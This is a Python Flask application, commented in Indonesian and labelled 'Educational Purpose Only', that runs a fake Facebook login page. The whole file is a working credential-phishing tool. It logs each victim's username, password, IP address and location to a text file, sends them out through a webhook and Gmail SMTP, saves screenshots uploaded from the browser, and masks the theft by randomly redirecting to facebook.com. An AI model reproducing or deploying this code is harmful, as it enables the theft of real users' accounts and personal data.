# app.py — Facebook Login Clone (Educational Purpose Only)
from flask import Flask, request, render_template, redirect, jsonify
from datetime import datetime
import requests
import smtplib
from email.mime.text import MIMEText
import base64
import random
import os
from threading import Lock

app = Flask(__name__)
file_lock = Lock()

# ================== CONFIG (GANTI DI SINI) ==================
YOUR_EMAIL = "your-email@gmail.com"          # GANTI
APP_PASSWORD = "your-app-password-here"      # GANTI (16 digit)
WEBHOOK_URL = "https://webhook.site/your-id" # GANTI atau kosongin
# ===========================================================

def kirim_email(ip, loc, username, password):
    if YOUR_EMAIL == "your-email@gmail.com" or not APP_PASSWORD:
        print("[!] Email belum dikonfigurasi")
        return
    try:
        msg = MIMEText(f"""
New Login Captured
Time: {datetime.now()}
IP: {ip}
Location: {loc}
Username: {username}
Password: {password}
        """)
        msg['Subject'] = 'New Facebook Login'
        msg['From'] = YOUR_EMAIL
        msg['To'] = YOUR_EMAIL

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(YOUR_EMAIL, APP_PASSWORD)
            server.send_message(msg)
        print(f"[+] Email terkirim: {username}")
    except Exception as e:
        print(f"[!] Gagal kirim email: {e}")

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()

    # Ambil IP
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    # Lokasi
    loc = "Unknown"
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            loc = f"{data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}"
    except:
        pass

    if not username or not password:
        return "Invalid input", 400

    # Simpan log
    log = f"[{datetime.now()}] {ip} | {loc} | {username} | {password}\n"
    with file_lock:
        with open('fb_logs.txt', 'a', encoding='utf-8') as f:
            f.write(log)

    # Kirim webhook
    if WEBHOOK_URL and "your-id" not in WEBHOOK_URL:
        try:
            requests.post(WEBHOOK_URL, json={"ip": ip, "loc": loc, "user": username, "pass": password})
        except:
            pass

    # Kirim email
    kirim_email(ip, loc, username, password)

    # Random redirect
    return render_template('error.html') if random.choice([True, False]) else redirect("https://facebook.com")

@app.route('/screenshot', methods=['POST'])
def screenshot():
    try:
        data = request.get_json()
        img_data = data['image'].split(',')[1]
        os.makedirs('static/screenshots', exist_ok=True)
        filename = f"static/screenshots/shot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(img_data))
        print(f"[+] Screenshot saved: {filename}")
        return jsonify({"status": "OK"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    os.makedirs('static/screenshots', exist_ok=True)
    app.run(host='0.0.0.0', port=5000, debug=False)